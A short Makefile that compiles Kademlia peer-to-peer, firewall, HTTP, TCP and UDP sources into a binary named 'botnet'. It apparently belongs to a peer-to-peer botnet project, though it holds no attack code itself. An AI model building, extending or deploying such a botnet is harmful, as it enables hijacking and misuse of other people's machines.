CC=g++
CFLAGS=-g -Wall -Werror -Iinclude -D_DEBUG
FILES=src/main.cpp src/kad/contact.cpp src/kad/firewall.cpp src/kad/kad.cpp src/kad/kbucket.cpp src/kad/nodes_dat.cpp src/kad/routingtable.cpp src/kad/search.cpp src/kad/searchtask.cpp src/kad/zone.cpp src/lib/libs.cpp src/net/http.cpp src/net/ip.cpp src/net/tcp.cpp src/net/udp.cpp src/tcp/tcpserver.cpp

all:
	$(CC) $(CFLAGS) $(FILES) -o botnet

clean:
	rm -fr botnet
